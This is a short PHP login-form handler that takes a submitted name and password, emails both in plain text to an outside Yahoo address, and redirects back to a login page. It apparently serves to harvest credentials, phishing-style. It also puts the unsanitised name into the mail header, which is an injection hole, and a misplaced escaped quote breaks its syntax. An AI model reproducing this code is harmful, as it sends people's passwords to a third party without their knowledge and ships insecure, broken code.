<?php  
if (isset($_POST['submit'])) {
	$name= $_POST['name'];
	$password= $_POST['password'];

	$mailTo = "isoexauto@yahoo.com";
	$headers= "FROM:".$name;
	$txt = "New user request to sign in as:".$name.".\n\n\".$password;
	


	mail($mailTo, $name, $txt, $headers);
	header("Location: log_in.php?mailsent");

}